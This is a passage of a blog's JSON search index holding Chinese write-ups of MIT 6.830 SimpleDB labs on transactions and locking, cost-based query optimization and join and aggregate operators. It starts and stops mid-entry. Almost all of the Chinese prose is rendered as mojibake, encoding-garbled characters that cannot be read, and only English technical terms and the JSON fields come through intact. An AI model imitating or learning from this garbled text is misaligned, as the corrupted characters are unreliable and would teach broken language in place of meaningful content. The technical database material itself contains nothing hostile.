PageLockType\u003e\u003eä¸­ï¼Œä½¿ç”¨javaå†…ç½®çš„synchronizedå¯¹å…¶acquire/releaseæ–¹æ³•è¿›è¡ŒåŒæ­¥ã€‚ ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab4-simpledb-transactions/:2:1","tags":null,"title":"MIT 6.830 Lab4 SimpleDB Transactions","uri":"/posts/mit-6.830-lab4-simpledb-transactions/"},{"categories":null,"content":"2. Lock Lifetime å®ç°ä¸Šè¿°çš„strict-2PLã€‚åœ¨ä¹‹å‰çš„è®¾è®¡ä¸­ï¼Œè¯»å–ä»»ä½•pageéƒ½ä½¿ç”¨äº†BufferPool.getPage()ï¼Œä¿è¯äº†growing phaseã€‚ ä¸ºäº†ä¿è¯strict shrinking phaseï¼Œåº”è¯¥åœ¨äº‹åŠ¡commit/abortæ—¶ä¸€æ¬¡æ€§é‡Šæ”¾æ‰€æœ‰çš„é”ã€‚å¦‚æœæˆ‘ä»¬é€šè¿‡éå†bufferpoolä¸­å½“å‰çš„pageï¼Œå¹¶åˆ¤æ–­æ˜¯å¦åŠ é”ï¼Œç„¶åé‡Šæ”¾çš„è¯ï¼Œé€»è¾‘ä¸Šæ˜¯æœ‰bugçš„ï¼Œå› ä¸ºè¢«åŠ é”çš„pageæœ‰å¯èƒ½åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­è¢«evictäº†ï¼Œæ‰€ä»¥è¦åœ¨PageLockManagerä¸­æ·»åŠ ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºé‡Šæ”¾æŒ‡å®šäº‹åŠ¡ä¸Šæ‰€æœ‰çš„é”ã€‚ æ­¤å¤–ï¼Œåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œ2PLæœ‰ä¸€ä¸ªä¾‹å¤–ã€‚é‚£å°±æ˜¯å¯¹HeapFileæ’å…¥æ—¶ï¼ŒæŸ¥æ‰¾æœ‰ç©ºslotçš„pageï¼Œå¦‚æœä¸€ä¸ªpageä¸Šæ²¡æœ‰ç©ºslotï¼Œé‚£ä¹ˆæ­¤æ—¶å¯ä»¥é‡Šæ”¾è¯¥pageä¸Šçš„é”ï¼Œç„¶åç»§ç»­æŸ¥æ‰¾å…¶ä»–pageã€‚è¿™æ˜¯å› ä¸ºæ’å…¥æ—¶æˆ‘ä»¬ä»…ä»…æ˜¯æŸ¥çœ‹è¯¥pageæœ‰æ²¡æœ‰ç©ºslotè€Œå·²ï¼Œå¹¶æ²¡æœ‰å…¶ä¸Šä»»ä½•ä¿¡æ¯ ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab4-simpledb-transactions/:2:2","tags":null,"title":"MIT 6.830 Lab4 SimpleDB Transactions","uri":"/posts/mit-6.830-lab4-simpledb-transactions/"},{"categories":null,"content":"3. Implementing NO STEAL No Stealç­–ç•¥ä¿è¯äº†dirty pageä¸ä¼šè¢«evictï¼Œå°±ä¿è¯äº†äº‹åŠ¡æäº¤å‰ï¼Œä¿®æ”¹ä¸ä¼šè½ç›˜ï¼Œä¸éœ€å¯¹diskæ–‡ä»¶å›æ»šã€‚åªéœ€è¦ç®€å•ä¿®æ”¹evictPageæ–¹æ³•ï¼Œä¸æ·˜æ±°dirty pageå°±å¥½äº†ï¼Œå¦‚æœå…¨æ˜¯dirty pageï¼Œå°±æŠ›å¼‚å¸¸ã€‚ ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab4-simpledb-transactions/:2:3","tags":null,"title":"MIT 6.830 Lab4 SimpleDB Transactions","uri":"/posts/mit-6.830-lab4-simpledb-transactions/"},{"categories":null,"content":"4. Transactions åœ¨SimpleDBä¸­ï¼Œæ¯ä¸ªqueryå¼€å§‹æ—¶ï¼Œåˆ›å»ºä¸€ä¸ªTransactionIdå¯¹è±¡ã€‚è¿™ä¸ªå¯¹è±¡è¢«ä¼ é€’åˆ°æ‰€æœ‰åœ¨queryä¸­è¢«è°ƒç”¨çš„operatorä¸­ã€‚å½“queryå®Œæˆåï¼Œå†è°ƒç”¨BufferPoolçš„transactionCompleteæ–¹æ³•ã€‚ åœ¨comitæ—¶ï¼Œåº”å½“æŠŠBufferPoolä¸­è·Ÿäº‹åŠ¡ç›¸å…³çš„dirty pageéƒ½flushï¼›å½“äº‹åŠ¡ç»ˆæ­¢ï¼Œåº”è¯¥å°†ä¸äº‹åŠ¡ç›¸å…³çš„dirty pageéƒ½ä»diskè¯»å›ï¼Œå°†BufferPoolä¸­çš„pageå˜æˆäº‹åŠ¡æ‰§è¡Œå‰çš„çŠ¶æ€ã€‚ è¿™é‡Œé€»è¾‘å¾ˆç®€å•ï¼Œä½†å…³äºäº‹åŠ¡abortï¼Œæˆ‘è¿›äº†ä¸ªå‘ï¼Œlab4çš„æµ‹è¯•å‹åŠ›å¤ªå°ï¼Œæ²¡æµ‹å‡ºæ¥ï¼ŒæŒ‚åœ¨lab5çš„BTreeTestä¸Šï¼ŒæŸ¥äº†ä¸¤å¤©çš„bugã€‚ å¦‚æœäº‹åŠ¡æ˜¯åœ¨insertTuple/deleteTupleæ‰§è¡Œå®Œä¹‹åå†abortï¼Œé‚£ä¹ˆç”±äºno stealï¼Œabortæ—¶è¯¥äº‹åŠ¡çš„dirty pageä¸€å®šåœ¨BufferPoolä¸­è¢«æ ‡è®°ä¸ºdirtyäº†ï¼Œé€šè¿‡éå†BufferPoolä¸­çš„pageï¼Œå¹¶å°†dirty pageè¯»å›æ˜¯å¯è¡Œçš„ï¼›ä½†å¦‚æœåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å°±abortäº†ï¼Œé‚£ä¹ˆBufferPoolä¸­è¢«äº‹åŠ¡è·å–çš„pageè¿˜æ²¡æœ‰æ ‡è®°dirtyï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡PageLockManageræ¥æŸ¥çœ‹å“ªäº›pageè¢«åŠ äº†exclusiveé”ï¼Œå¹¶æŠŠè¿™äº›pageä»diskè¯»å›ã€‚ ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab4-simpledb-transactions/:2:4","tags":null,"title":"MIT 6.830 Lab4 SimpleDB Transactions","uri":"/posts/mit-6.830-lab4-simpledb-transactions/"},{"categories":null,"content":"5. Deadlocks and Aborts SimpleDBä¸­çš„äº‹åŠ¡å¯èƒ½æ­»é”ï¼Œéœ€è¦æ£€æµ‹å¹¶ä¸”æŠ›å‡ºTransactionAbortedExceptionã€‚ æ£€æµ‹æ­»é”çš„æ–¹å¼æœ‰å¾ˆå¤šç§ã€‚æœ€åŸºæœ¬çš„ä¾‹å­æ˜¯å®ç°ä¸€ä¸ªç®€å•çš„è¶…æ—¶ç­–ç•¥ï¼Œå¦‚æœä¸€ä¸ªäº‹åŠ¡åœ¨ç»™å®šçš„æ—¶é—´å†…è¿˜æ²¡æœ‰æ‹¿åˆ°éœ€è¦çš„é”ï¼Œå°±abortã€‚è€Œæ›´å®é™…çš„è§£å†³æ–¹æ¡ˆï¼Œå¯ä»¥åŸºäºç­‰å¾…å›¾ï¼Œå®šæœŸæ£€æŸ¥ä¾èµ–å›¾ä¸­çš„ç¯ï¼Œæˆ–è€…å½“äº‹åŠ¡t acquireä¸€ä¸ªæ–°çš„é”æ—¶ï¼Œå¦‚æœäº§ç”Ÿä¸€ä¸ªç¯ï¼Œå°±ä¸­æ­¢æŸäº‹åŠ¡ã€‚å¦‚æœç»ˆæ­¢tæ‰€ç­‰å¾…çš„äº‹åŠ¡ï¼Œå¯èƒ½ä¼šå¯¼è‡´çº§è”abortï¼Œä½†tèƒ½å–å¾—è¿›å±•ï¼›å¦‚æœç»ˆæ­¢tï¼Œé‚£ä¹ˆå…¶ä»–äº‹åŠ¡å¯ä»¥æ­£å¸¸è¿è¡Œã€‚ä½¿ç”¨åŸºäºç­‰å¾…å›¾çš„æ–¹æ¡ˆï¼Œéœ€è¦ä¿®æ”¹PageLockManagerçš„å®ç°ï¼Œæ‰€ä»¥æˆ‘å°±å®ç°äº†ç®€å•çš„è¶…æ—¶ç­–ç•¥ã€‚äº‹åŠ¡ä¼šä¸åœåœ°å°è¯•è·å–ä¸€ä¸ªé”ï¼Œå¦‚æœè¶…æ—¶å°±abortã€‚ ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab4-simpledb-transactions/:2:5","tags":null,"title":"MIT 6.830 Lab4 SimpleDB Transactions","uri":"/posts/mit-6.830-lab4-simpledb-transactions/"},{"categories":null,"content":"ç®€ä»‹ åœ¨lab2ä¸­ï¼Œå®ç°äº†SimpleDBä¸­çš„operatorï¼Œå¯¹operatorè¿›è¡Œç»„åˆï¼Œå°±å¯ä»¥æ‰§è¡ŒæŸ¥è¯¢äº†ï¼Œæ¶‰åŠæŸ¥è¯¢ï¼Œå°±åº”å½“è¿›è¡ŒæŸ¥è¯¢ä¼˜åŒ–äº†ã€‚lab3ä¸­ï¼Œè¦å®ç°ä¸€ä¸ªcost-based optimizerã€‚ cost-based optimizerçš„ä¸»è¦è®¾è®¡å¦‚ä¸‹ï¼š ä½¿ç”¨è¡¨çš„ç»Ÿè®¡ä¿¡æ¯æ¥è¯„ä¼°ä¸åŒquery plançš„costã€‚é€šå¸¸ï¼Œquery plançš„costä¸intermediate join/selectionçš„åŸºæ•°ä»¥åŠfilter/join predicatesçš„selectivityï¼ˆæ­¤å¤„ç†è§£ä¸ºæ»¡è¶³predicatesçš„tupleæ‰€å æ¯”ä¾‹ï¼‰æœ‰å…³ã€‚ ä½¿ç”¨è¿™äº›ä¿¡æ¯å°†ä»¥æœ€ä¼˜çš„æ–¹å¼å°†selectionå’Œjoinæ’åºï¼Œå¹¶é€‰æ‹©æœ€ä¼˜çš„ç®—æ³•å»å®ç°joinã€‚ optimizerçš„æ¶æ„å¦‚ä¸‹ï¼š Parseråˆå§‹åŒ–æ—¶ï¼Œæ„é€ ä¸€ä¸ªtableç»Ÿè®¡ä¿¡æ¯çš„é›†åˆï¼ˆstatsMapï¼‰ã€‚ç„¶åç­‰å¾…queryè¾“å…¥ï¼Œå¹¶å¯¹è¾“å…¥çš„queryè°ƒç”¨parseQueryã€‚ parseQueryé¦–å…ˆæ„é€ å‡ºLogicalPlanï¼Œç„¶åparseQueryè°ƒç”¨LogicalPlanå¯¹è±¡ä¸Šçš„physicalPlanæ–¹æ³•ã€‚physicalPlanæ–¹æ³•è¿”å›ä¸€ä¸ªDBIteratorå¯¹è±¡ï¼Œç”¨äºå®é™…æ‰§è¡Œqueryã€‚ ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab3-query-optimization/:1:0","tags":null,"title":"MIT 6.830 Lab3 Query Optimization","uri":"/posts/mit-6.830-lab3-query-optimization/"},{"categories":null,"content":"Exercises ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab3-query-optimization/:2:0","tags":null,"title":"MIT 6.830 Lab3 Query Optimization","uri":"/posts/mit-6.830-lab3-query-optimization/"},{"categories":null,"content":"1. Statistics Estimation å‡†ç¡®ä¼°è®¡costæ˜¯éå¸¸trickyçš„ã€‚åœ¨æœ¬labä¸­ï¼Œåªå…³å¿ƒä¸€ç³»åˆ—joinä»¥åŠè¡¨è®¿é—®çš„costï¼Œæ— éœ€å…³ç³»access methodçš„é€‰æ‹©ï¼ˆç°åœ¨ä¹Ÿåªæœ‰scan HeapFileä¸€ç§ï¼‰å’Œå…¶ä»–operatorçš„å¼€é”€ï¼ˆå¦‚aggregatesï¼‰ã€‚ 1.1 Overall Plan Cost p=t1 join t2 join ... tn è¡¨ç¤ºä¸€ä¸ªleft deep joinï¼Œä¸”t1æ˜¯left-mostçš„ï¼Œå…¶costè¡¨ç¤ºä¸ºï¼š scancost(t1) + scancost(t2) + joincost(t1 join t2) + scancost(t3) + joincost((t1 join t2) join t3) + ... scancostæ˜¯I/Oå¼€é”€ï¼Œjoincostæ˜¯cpuå¼€é”€ï¼Œä¸ºäº†ä¸¤è€…å¯ä»¥æ¯”è¾ƒ cost(predicate application) = 1 cost(pageScan) = SCALING_FACTOR x cost(predicate application) æœ¬labå¿½ç•¥ç¼“å­˜çš„ä½œç”¨ï¼ˆå³è®¤ä¸ºæ¯æ¬¡è®¿é—®tableçš„costéƒ½æ˜¯ä¸€æ¬¡å®Œæ•´scançš„costï¼‰ã€‚ 1.2 Join Cost nested-loop joinçš„costå¦‚ä¸‹ï¼š joincost(t1 join t2) = scancost(t1) + ntups(t1) x scancost(t2) //IO cost + ntups(t1) x ntups(t2) //CPU cost 1.3 Filter Selectivity éœ€è¦è¯„ä¼°ä¸€ä¸ªtableä¸­æ»¡è¶³predicateçš„tupleæ•°é‡ï¼Œæœ¬labä¸­é‡‡ç”¨åŸºäºç›´æ–¹å›¾çš„æ–¹æ¡ˆï¼š å¯¹æ¯ä¸ªFieldï¼Œè®¡ç®—å‡ºå…¶æœ€å°æœ€å¤§å€¼ï¼ˆscanä¸€æ¬¡ï¼‰ï¼› å¯¹æ¯ä¸ªå±æ€§æ„é€ ç›´æ–¹å›¾ï¼Œå¯ä»¥ä½¿ç”¨å›ºå®šä¸ªæ•°çš„bucketï¼› å†æ¬¡æ‰«æï¼Œå¡«å……ç›´æ–¹å›¾ï¼› å¯¹ä¸€ä¸ªf=constçš„æŸ¥è¯¢ï¼Œå…¶å±äºçš„bucketï¼Œå®½åº¦ä¸ºwï¼Œé«˜åº¦ä¸ºhï¼ˆtupleä¸ªæ•°ï¼‰ï¼Œtableæ€»tupleæ•°ä¸ºntupsï¼Œé‚£ä¹ˆselectivityæ˜¯*(h / w) / ntups*ã€‚*(h/w)*è¡¨ç¤ºconstå€¼åœ¨è¯¥bucketä¸­çš„æ•°é‡çš„ä¼°è®¡å€¼ï¼› å¯¹äºf\u003econstæŸ¥è¯¢ï¼Œæ‰¾å‡ºconstæ‰€åœ¨bucket bï¼Œå…¶å®½åº¦w_bï¼Œé«˜åº¦h_bï¼Œb_part = (b_right - const)/w_bï¼Œbåœ¨æ•´ä¸ªç›´æ–¹å›¾å æ¯”b_f = h_b / ntupsï¼Œé‚£ä¹ˆbå¯¹selectivityçš„è´¡çŒ®æ˜¯b_f * b_partã€‚ç„¶åå†ç®—å‡ºbå³è¾¹æ‰€æœ‰bucketçš„selectivityï¼› å¯¹äºf\u003cconstï¼ŒåŒä¸Šã€‚ SimpleDBä»…æ”¯æŒIntå’ŒStringï¼Œæ‰€ä»¥ç›´æ–¹å›¾ä¹Ÿè¦å®ç°ä¸¤ç§ã€‚StringHistogramæ˜¯åŸºäºIntHistogramçš„ï¼Œæ‰€ä»¥å…¶å®åªéœ€è¦å®ç°IntHistogramã€‚ ç„¶åæ˜¯å®ç°TableStatsç±»ï¼Œå®ƒä¼šè®¡ç®—tableçš„tupleåŠpageçš„æ•°é‡ï¼Œå¹¶ä½¿ç”¨ç›´æ–¹å›¾ä¼°è®¡ä¼°è®¡æŸäº›predicateçš„selectivityã€‚query parserä¼šå¯¹queryæ¶‰åŠçš„æ¯ä¸ªtableåˆ›å»ºä¸€ä¸ªTableStatså®ä¾‹ï¼Œç„¶åå°†å…¶ä¼ é€’ç»™query optimizerã€‚ 1.4 Join Cardinality è¯„ä¼°å½¢å¦‚ï¼šjoincost((t1 join t2) join t3)çš„join plan pçš„å¼€é”€ã€‚join cardinalityçš„è¯„ä¼°ï¼Œå…¶å®æ¯”selectivityæ›´éš¾ã€‚åœ¨æœ¬labä¸­ï¼Œå®ç°JoinOptimizerç±»ï¼Œåªéœ€åŸºäºä»¥ä¸‹ç®€å•è§„åˆ™è¿›è¡Œï¼š å¯¹äºç­‰å€¼joinï¼Œå¦‚æœjoin keyä¸­å…¶ä¸­ä¸€ä¸ªæ˜¯ä¸»é”®ï¼Œé‚£ä¹ˆé‚£ä¹ˆè¯¥joinäº§ç”Ÿtupleæ•°é‡ä¸å¯èƒ½è¶…è¿‡å¦ä¸€ä¸ªéä¸»å±æ€§çš„cardinalityï¼› å¯¹äºç­‰å€¼joinï¼Œå½“æ²¡æœ‰primary keyæ—¶ï¼Œå¾ˆéš¾è¯´ã€‚å¯ä»¥ç”¨ä¸€äº›å¾ˆç®€å•çš„æ–¹æ³•ï¼ˆæ¯”å¦‚è¿”å›è¾ƒå¤§è¡¨çš„cardinalityï¼‰ï¼› å¯¹äºrange scanï¼Œä»ç„¶å¾ˆéš¾è¯´ã€‚è¾“å‡ºçš„sizeåº”è¯¥å’Œè¾“å…¥çš„sizeæˆæ­£æ¯”ã€‚å¯ä»¥å‡å®šcross-productçš„å›ºå®šæ¯”ä¾‹è¢«è¾“å‡ºï¼ˆä¾‹å¦‚30%ï¼‰ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œrange joinçš„coståº”è¯¥å¤§äºåŒæ ·å¤§å°çš„ä¸¤ä¸ªè¡¨çš„éä¸»é”®ç­‰å€¼joinçš„costã€‚ ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab3-query-optimization/:2:1","tags":null,"title":"MIT 6.830 Lab3 Query Optimization","uri":"/posts/mit-6.830-lab3-query-optimization/"},{"categories":null,"content":"2. Join Ordering å®ç°Selingerä¼˜åŒ–å™¨ã€‚åœ¨æ¥ä¸‹çš„æ–¹æ³•ä¸­ï¼Œjoinè¢«è¡¨è¾¾ä¸ºjoin nodesï¼ˆå³ï¼Œ2ä¸ªtableä¸Šçš„predicateï¼‰çš„åˆ—è¡¨ï¼Œè€Œä¸æ˜¯å‰é¢classä¸­çš„ç”¨äºjoinçš„relationçš„åˆ—è¡¨ã€‚ Selingerç®—æ³•ï¼šåªè€ƒè™‘left-deep joinã€‚ä»å¤§å°ä¸º1çš„å­é›†å¼€å§‹ï¼Œä¸æ–­æ±‚å‡ºæ¯ä¸ªå­é›†çš„æœ€ä½³joiné¡ºåºã€‚ä»size ä¸ºiçš„å­é›†ä¸æ–­æ‰©å¤§åˆ°sizeä¸º i+1çš„å­é›†ï¼Œæ˜¯ä¸€ä¸ªåŠ¨æ€è§„åˆ’æ–¹æ³•ã€‚ å°†å…¶è½¬åŒ–ä¸ºå¦‚ä¸‹ä¼ªä»£ç ï¼š 1. j = set of join nodes 2. for (i in 1...|j|): 3. for s in {all length i subsets of j} 4. bestPlan = {} 5. for s' in {all length d-1 subsets of s} 6. subplan = optjoin(s') 7. plan = best way to join (s-s') to subplan 8. if (cost(plan) \u003c cost(bestPlan)) 9. bestPlan = plan 10. optjoin(s) = bestPlan 11. return optjoin(j) è¿™ä¸ªç®—æ³•æœ¬èº«ä¸éš¾ï¼Œå¹¶ä¸”ä¼ªä»£ç ä¸­çš„subsetã€costç­‰åŠŸèƒ½ï¼ŒSimpleDBéƒ½æä¾›ç»™æˆ‘ä»¬äº†ï¼ŒæŠŠä¼ªä»£ç è½¬å†™ä¸ºjavaå°±OKäº†ã€‚ ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab3-query-optimization/:2:2","tags":null,"title":"MIT 6.830 Lab3 Query Optimization","uri":"/posts/mit-6.830-lab3-query-optimization/"},{"categories":null,"content":"ç®€ä»‹ lab1ä¸­å®ç°äº†SeqScan operatorï¼Œå®ƒä½œä¸ºåç»­æ‰€æœ‰operatorè¯»å–æ•°æ®çš„åŸºç¡€ã€‚lab2ä¸­å°†ç»§ç»­å®ç°å…¶ä»–çš„operatorï¼Œè¿™æ ·SimpleDBå°±æœ‰äº†åŸºæœ¬çš„æ•°æ®å­˜å‚¨ä¸æŸ¥è¯¢åŠŸèƒ½ã€‚ ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab2-operators/:1:0","tags":null,"title":"MIT 6.830 Lab2 Operators","uri":"/posts/mit-6.830-lab2-operators/"},{"categories":null,"content":"Exercises ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab2-operators/:2:0","tags":null,"title":"MIT 6.830 Lab2 Operators","uri":"/posts/mit-6.830-lab2-operators/"},{"categories":null,"content":"1. Filter and Join Filter ä»…è¿”å›æ»¡è¶³æŸä¸ªPredicateçš„tuplesã€‚Predicateç±»æ ¹æ®è¢«ä¼ å…¥çš„Tupleçš„æŸä¸ªFieldæ¥åˆ¤æ–­Tupleæ˜¯å¦ç¬¦åˆè¦æ±‚ã€‚ Predicateæ”¯æŒä¸ƒç§ç±»å‹çš„ç­›é€‰æ¡ä»¶ï¼šEQUALSï¼ŒGREATER_THAN, LESS_THAN, LESS_THAN_OR_EQ, GREATER_THAN_OR_EQ, LIKE, NOT_EQUALS; Join Join operatorä½¿ç”¨JoinPredicateå°†ä¸¤ä¸ªå­operatorè¿”å›çš„ç»“æœè¿›è¡Œjoinã€‚JoinPredicateæ ¹æ®è¢«ä¼ å…¥çš„ä¸¤ä¸ªTupleçš„ä¸¤ä¸ªFieldåˆ¤æ–­æ˜¯å¦æ»¡è¶³joinæ¡ä»¶ã€‚ å®ç°Joinå¯ä»¥ä¸€èˆ¬æœ‰ä¸‰ç§æ–¹å¼ï¼ˆå†æ¬¡å€Ÿç”¨CMU 15-445çš„PPTï¼‰ï¼š NESTED LOOP JOIN ç›´æ¥ä½¿ç”¨åŒå±‚å¾ªç¯ï¼Œæ˜¯æœ€ç¬¦åˆç›´è§‰çš„joinæ–¹å¼ã€‚ å¯ä»¥ä½¿ç”¨åˆ†å—ï¼ˆPageï¼‰è¯»å–è¿›è¡Œä¼˜åŒ–ï¼Œå³BLOCK NESTED LOOP JOINï¼Œä¸è¿‡å…¶å®æˆ‘ä»¬lab1ä¸­å®ç°çš„SeqScanå¯¹ä¸Šå±‚operatoræ˜¯é€æ˜çš„ï¼Œå¹¶ä¸”Pageæ¥å£æ²¡æœ‰å®šä¹‰è·å–ä¸€ä¸ªPageæœ‰å¤šå°‘Tupleçš„æ–¹æ³•ï¼ˆHeapPageæœ‰ï¼Œä½†ä¸é€šç”¨ï¼‰ï¼Œæ‰€ä»¥åœ¨SimpleDBä¸­ä¸å¥½ç›´æ¥å®ç°ã€‚ å¦‚æœåœ¨join keyä¸Šæœ‰indexï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åŸºäºindexè¿›è¡Œä¼˜åŒ– SORT-MERGE JOIN ç®—æ³•é€»è¾‘å¦‚ä¸‹å›¾ï¼Œä½†æ˜¯æ ¹æ®JoinPredicateçš„ä¸åŒï¼Œæœ‰æ—¶å€™éœ€è¦å›æº¯cursorï¼Œä¾‹å¦‚s.value \u003c r.valueè¿™ç§ã€‚ HASH JOIN åŸºäºHashçš„joinï¼Œéå¸¸é«˜æ•ˆï¼Œä½†æ˜¯è¿™ç§æ–¹æ³•ä¸€èˆ¬åªé€‚ç”¨äºç­‰å€¼Joinã€‚ ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab2-operators/:2:1","tags":null,"title":"MIT 6.830 Lab2 Operators","uri":"/posts/mit-6.830-lab2-operators/"},{"categories":null,"content":"2. Aggregates æˆ‘ä»¬éœ€è¦å®ç°äº”ç§åŸºæœ¬èšåˆå‡½æ•°ï¼šCOUNT, SUM, AVG, MIN, MAXï¼Œå®éªŒä¸­åªéœ€è¦æ”¯æŒå¯¹å•ä¸ªFieldè¿›è¡Œgroup byä¸èšåˆã€‚ SimpleDBå®šä¹‰äº†Aggregatoræ¥å£ï¼Œä¸Šå±‚operatorè°ƒç”¨å…¶mergeTupleIntoGroup(Tuple tup)æ–¹æ³•ï¼Œä¸æ–­åœ°ä¼ å…¥Tupleï¼ŒAggregatorä¸æ–­æ›´æ–°èšåˆçš„çŠ¶æ€ã€‚è¿™ç§è®¾è®¡ä¹Ÿæœ‰åˆ©äºqueryæ‰§è¡Œçš„pipelineåŒ–ï¼›Aggregatorè¿˜å®šä¹‰äº†iterator()æ–¹æ³•ï¼Œç”¨äºè¿­ä»£å…¶å½“å‰èšåˆç»“æœã€‚SimpleDBåªæ”¯æŒä¸¤ç§æ•°æ®ç±»å‹ï¼ˆINTå’ŒStringï¼‰ï¼Œæ‰€ä»¥éœ€è¦å®ç°ä¸¤ç§å¯¹åº”çš„Aggregatorï¼Œä½¿ç”¨ç®€å•çš„åŸºäºhashçš„æ–¹æ³•å®ç°å°±å¥½ã€‚ ç„¶åè¿˜éœ€è¦å®ç°Aggregate operatorï¼Œå®ƒå°†å­operatorè¾“å‡ºçš„Tupleså…¨éƒ¨ä¼ é€’ç»™Aggregatorï¼Œèšåˆå®Œæˆåå†å‘å¤–è¾“å‡ºtuplesã€‚ ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab2-operators/:2:2","tags":null,"title":"MIT 6.830 Lab2 Operators","uri":"/posts/mit-6.830-lab2-operators/"},{"categories":null,"content":"3. HeapFile Mutability ç›®å‰ä¸ºæ­¢ï¼ŒSimpleDBéƒ½è¿˜æ˜¯åªè¯»çš„ã€‚æ‰€ä»¥éœ€è¦å®ç°ä¿®æ”¹è¡¨çš„æ–¹æ³•ã€‚ å¯¹deleteTupleï¼Œæ¯ä¸ªTupleä¸­éƒ½åŒ…å«RecordIdï¼Œæ‰€ä»¥å¯ä»¥ç¡®å®šè¯¥Tupleåœ¨å“ªä¸ªpageï¼Œç„¶ååˆ é™¤ã€‚ å¯¹insertTupleï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨HeapFileä¸­éå†HeapPageï¼Œæ‰¾åˆ°æœ‰ç©ºslotçš„pageï¼Œç„¶åæ’å…¥ï¼›å¦‚æœæ‰¾ä¸åˆ°å¸¦æœ‰ç©ºslotçš„pageï¼Œé‚£ä¹ˆå°±æ–°å»ºä¸€ä¸ªPageå¹¶å†™å…¥æ–‡ä»¶ã€‚ è·Ÿlab1ä¸­ç›¸åŒï¼Œè·å–pageï¼Œä¸€å®šè¦é€šè¿‡BufferPool.getPage()ï¼Œè¿™æ ·å¯¹pageçš„è®¿é—®æ‰èƒ½è¢«çº³å…¥ç®¡ç†ï¼Œæ–¹ä¾¿åé¢å®ç°äº‹åŠ¡ã€‚ insertTupleå’ŒdeleteTupleè¿™ä¸¤ä¸ªmutableçš„æ–¹æ³•ï¼Œä¼šé€ æˆPageçš„ä¿®æ”¹ï¼Œå³äº§ç”Ÿdirty pageï¼ˆä¿®æ”¹ä»…åœ¨å†…å­˜ä¸­ï¼Œæœªå†™å…¥diskï¼‰ã€‚DbFileæ‰§è¡Œå®ŒdeleteTupleåŠinsertTupleåï¼Œä¼šè¿”å›dirty pageï¼ŒBufferPooléœ€è¦è°ƒç”¨Page.markDirty()æ ‡è®°è¯¥pageï¼Œå¦‚æœpageä¸åœ¨BufferPoolä¸­ï¼Œè¿˜éœ€è¦å°†å…¶åŠ å…¥ï¼ˆæ˜æ˜æ˜¯é€šè¿‡BufferPoolè·å–çš„pageï¼Œä¸ºä»€ä¹ˆå¯èƒ½ä¼šä¸åœ¨BufferPoolä¸­å‘¢ï¼Ÿå½“ç„¶æ˜¯å› ä¸ºåé¢çš„page evictionäº†ï¼‰ã€‚ ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab2-operators/:2:3","tags":null,"title":"MIT 6.830 Lab2 Operators","uri":"/posts/mit-6.830-lab2-operators/"},{"categories":null,"content":"4. Page eviction lab1ä¸­ï¼Œå½“ä½¿ç”¨pageæ•°é‡è¶…å‡ºBufferPoolé™åˆ¶ï¼Œç›´æ¥æŠ›å¼‚å¸¸äº†ã€‚è¿™æ˜¯è‚¯å®šä¸è¡Œçš„ï¼Œæ‰€ä»¥å½“BufferPoolæ»¡äº†ï¼Œè¿˜è¦è¯»å–æ–°çš„pageæ—¶ï¼Œåº”å½“ä»ç°æœ‰pageä¸­æ·˜æ±°ä¸€ä¸ªï¼Œå¯ä»¥é€‰æ‹©å®ç°æœ€å¸¸è§çš„LRUç­–ç•¥ã€‚ ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab2-operators/:2:4","tags":null,"title":"MIT 6.830 Lab2 Operators","uri":"/posts/mit-6.830-lab2-operators/"},{"categories":null,"content":"ç®€ä»‹ 6.830/6.814æ˜¯MITçš„å…³ç³»å‹æ•°æ®åº“å…¥é—¨è¯¾ç¨‹ï¼ŒSimpleDBä½œä¸ºè¯¾ç¨‹å®éªŒï¼Œå®ç°äº†åŸºç¡€çš„æ•°æ®åº“åŠŸèƒ½ï¼Œå­¦ç”Ÿéœ€è¦å®ç°å…¶ä¸­ç¼ºå°‘çš„æ ¸å¿ƒæ¨¡å—ã€‚SimpleDBé‡‡ç”¨Javaç¼–å†™ï¼Œæ¯”å¦ä¸€é—¨æ•°æ®åº“åè¯¾CMU 15-445/645ä½¿ç”¨Cppæ›´å‹å¥½ï¼Œå¯ä»¥ä¸ç”¨æ€»æ˜¯è€ƒè™‘å†…å­˜å®‰å…¨çš„é—®é¢˜ï¼›ä¸è¿‡Javaå…¨éƒ¨pass by referenceä¹Ÿç»™æˆ‘é€ æˆä¸€ç‚¹é—®é¢˜ï¼Œæœ‰æ—¶å€™éœ€è¦è€ƒè™‘ä¼ é€’è¿‡å»çš„å¯¹è±¡æ˜¯å¦ä¼šè¢«æ”¹å˜ï¼Œè¢«æ”¹å˜äº†æ˜¯å¦ä¼šå¯¹å…¶ä»–ä½ç½®çš„referenceé€ æˆé—®é¢˜ã€‚ 6.830å’ŒCMU 15-445æ˜¯åŸºæœ¬å·®ä¸å¤šçš„ï¼ŒCMU 15-445çš„Andyè€å¸ˆè¯¾è®²çš„å¾ˆå¥½ï¼Œæœ¬äººæ˜¯è§‚çœ‹CMU 15-445è¯¾ç¨‹å­¦ä¹ ä¸€äº›æ‰€éœ€æ•°æ®åº“çŸ¥è¯†ï¼Œç„¶ååšçš„6.830çš„å®éªŒã€‚ä»äºŒæœˆåˆå¼€å§‹ï¼Œè¡¥ä¸€äº›æ•°æ®åº“çš„çŸ¥è¯†ï¼Œåˆ°ä¸‰æœˆåˆæ–­æ–­ç»­ç»­å®Œæˆäº†å‰ä¸‰ä¸ªlabï¼›ç„¶åå‰å‡ 